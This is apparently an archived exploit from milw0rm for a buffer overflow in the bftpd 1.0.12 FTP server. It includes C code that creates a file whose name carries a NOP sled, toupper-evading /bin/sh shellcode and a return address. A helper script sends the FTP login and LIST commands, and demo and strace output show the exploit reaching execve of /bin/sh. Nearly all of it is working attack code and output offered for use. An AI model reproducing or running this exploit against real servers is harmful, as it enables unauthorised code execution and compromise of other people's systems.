/*                                                                                                                                             
  Creates a filname to exploit the bug in bftpd 1.0.12                                                                                           
  Create the file, cwd in the shell directory and nlist the file directory.  

  Coded by korty <cb@grolier.fr>
*/

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>


#define LEN 205

int main (int argc, char **argv)
{
  char buf[LEN + 12];
  int  ret = 0xbffffa80;
  int  *p;
  int  fp;
  
  char code[]=

 /*
  *  Linux/x86
  *
  *  toupper() evasion, standard execve() /bin/sh (used eg. in various
  *  imapd exploits). Goes through a loop adding 0x20 to the 
  *  (/bin/sh -= 0x20) string (ie. yields /bin/sh after addition).
  */

  /* main: */
  "\xeb\x29"                            /* jmp callz                   */
  /* start: */
  "\x5e"                                /* popl %esi                   */
  "\x29\xc9"                            /* subl %ecx, %ecx             */
  "\x89\xf3"                            /* movl %esi, %ebx             */
  "\x89\x5e\x08"                        /* movl %ebx, 0x08(%esi)       */
  "\xb1\x07"                            /* movb $0x07, %cl             */
  /* loopz: */
  "\x80\x03\x20"                        /* addb $0x20, (%ebx)          */
  "\x43"                                /* incl %ebx                   */
  "\xe0\xfa"                            /* loopne loopz                */
  "\x29\xc0"                            /* subl %eax, %eax             */
  "\x88\x46\x07"                        /* movb %al, 0x07(%esi)        */
  "\x89\x46\x0c"                        /* movl %eax, 0x0c(%esi)       */
  "\xb0\x0b"                            /* movb $0x0b, %al             */
  "\x87\xf3"                            /* xchgl %esi, %ebx            */
  "\x8d\x4b\x08"                        /* leal 0x08(%ebx), %ecx       */
  "\x8d\x53\x0c"                        /* leal 0x0c(%ebx), %edx       */
  "\xcd\x80"                            /* int $0x80                   */
  "\x29\xc0"                            /* subl %eax, %eax             */
  "\x40"                                /* incl %eax                   */
  "\xcd\x80"                            /* int $0x80                   */
  /* callz: */
  "\xe8\xd2\xff\xff\xff"                /* call start                  */
  "\x0f\x42\x49\x4e\x0f\x53\x48";       /* /bin/sh -= 0x20             */



  if (argc > 1) {
    ret += atoi(argv[1]);
    fprintf(stderr, "Using ret %#010x\n", ret);
  }

  memset(buf, '\x90', LEN);
  memcpy(buf + LEN - strlen(code), code, strlen(code));

  p = (int *) (buf + LEN);

  *p++ = ret;
  *p++ = ret;
  *p   = 0;

  fp = open(buf, O_CREAT);
  if(fp < 0) perror("buf");
  close(fp);

}
/*

-- BEGIN list.c --


#include <stdio.h>

int main()

{

#define USER "cb"
#define PASS "PasSwoRd"
#define PORT "port 127,0,0,1,4,4"  // Data on the port 1028 with the addr 127.0.0.1
#define CWD "cwd longfile"
#define LIST "list"

printf("user %s\n", USER);
sleep(1);
printf("pass %s\n", PASS);
sleep(1);
printf("%s\n", PORT);
sleep(1);
printf("%s\n", CWD);
sleep(1);
printf("%s\n", LIST);

}


-- END list.c --







  A)  DEMO  


tshaw:~/longfile$ gcc -o exploit exploit.c 
tshaw:~/longfile$ ls
exploit*  exploit.c  list.c
tshaw:~/longfile$ ls
exploit*  exploit.c  list.c
tshaw:~/longfile$ ./exploit 
tshaw:~/longfile$ ls
exploit*
exploit.c
list.c
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\313)^)\311\211\323\211^\b\221\a\200\003\ C
\300\332)\300\210F\a\211F\f\220\v\203\323\211K\b\211S\f\311\200)\300\@\311\200\310\322\333
\333\333\013BIN\013SH\200\332\333\233\200\332\333\233*
tshaw:~/longfile$ 

tshaw:~/longfile$ gcc -o list list.c

tshaw:~/longfile$ nc -l -p 1028 &
[1] 29973
tshaw:~/longfile$ 


tshaw:~/longfile$ (./list ; cat) | nc localhost 21
220 bftpd 1.0.12 at 127.0.0.1 ready.
331 Password please.
230 User logged in.
200 PORT 127.0.0.1:1028 OK
250 OK

150 Data connection established.
drwxr-xr-x   2 1000     100          4096 Dec  8 04:06 .
drwxr-xr-x  55 1000     100          4096 Dec  8 04:02 ..
-rw-r--r--   1 1000     100           323 Dec  8 04:06 list.c
-rwxr-xr-x   1 1000     100         11931 Dec  8 04:06 list
-rw-r--r--   1 1000     100          2178 Dec  8 03:54 exploit.c
-rwxr-xr-x   1 1000     100         12861 Dec  8 03:56 exploit
-r-xr--r--   1 1000     100             0 Dec  8 03:56 &#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;
&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;
&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;?^)??? C&#29481;)&#54594;F&#45935;
                                                                 ?
                                                                  &#45665;&#46858;S
                                                                       ?)??&#33048;&#63735;&#63735;&#63735;BINSH&#128;????

[1]+  Done                    nc -l -p 1028
tshaw:~/longfile$ 



   B)  STRACE OUTPUT


tshaw:~# ps -aef |grep bftpd

cb       30128    62  0 Dec04 ?        00:00:00 bftpd
root     30136 30024  0 Dec04 ttyqa    00:00:00 grep bftpd

tshaw:~# strace -p 30128

read(0, "\n", 4096)                     = 1
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 4
setsockopt(4, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
setsockopt(4, SOL_SOCKET, SO_SNDBUF, [65536], 4) = 0
bind(4, {sin_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("127.0.0.1")}}, 16) = 0
connect(4, {sin_family=AF_INET, sin_port=htons(1028), sin_addr=inet_addr("127.0.0.1")}}, 16) = 0
write(2, "150 Data connection established."..., 34) = 34
open("/dev/null", O_RDONLY|O_NONBLOCK|0x10000) = -1 ENOENT (No such file or directory)
stat(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
open(".", O_RDONLY|O_NONBLOCK|0x10000)  = 5
fstat(5, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
fcntl(5, F_SETFD, FD_CLOEXEC)           = 0
brk(0x8052000)                          = 0x8052000
getdents(5, /* 7 entries */, 3933)      = 328
stat("./.", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
send(4, "drwxr-xr-x   2 1000     100     "..., 58, 0) = 58
stat("./..", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
send(4, "drwxr-xr-x  55 1000     100     "..., 59, 0) = 59
stat("./list.c", {st_mode=S_IFREG|0644, st_size=323, ...}) = 0
send(4, "-rw-r--r--   1 1000     100     "..., 63, 0) = 63
stat("./list", {st_mode=S_IFREG|0755, st_size=11931, ...}) = 0
send(4, "-rwxr-xr-x   1 1000     100     "..., 61, 0) = 61
stat("./exploit.c", {st_mode=S_IFREG|0644, st_size=2178, ...}) = 0
send(4, "-rw-r--r--   1 1000     100     "..., 66, 0) = 66
stat("./exploit", {st_mode=S_IFREG|0755, st_size=12861, ...}) = 0
send(4, "-rwxr-xr-x   1 1000     100     "..., 64, 0) = 64
stat("./&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;?
&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47537;&#47662;)^)??? C&#29481;)&#54594;F&#45935;
                  ?
                   &#45665;&#46858;S
                        ?)??&#33048;&#63735;&#63735;&#63735;BINSH&#128;????, {st_mode=S_IFREG|S_ISUID|0544, st_size=0, ...}) = 0
send(4, "-r-xr--r--   1 1000     100     "..., 270, 0) = 270
execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = -1 ENOENT (No such file or directory)
_exit(-1073743151)                      = ?

tshaw:~# 

*/


// milw0rm.com [2000-12-11]
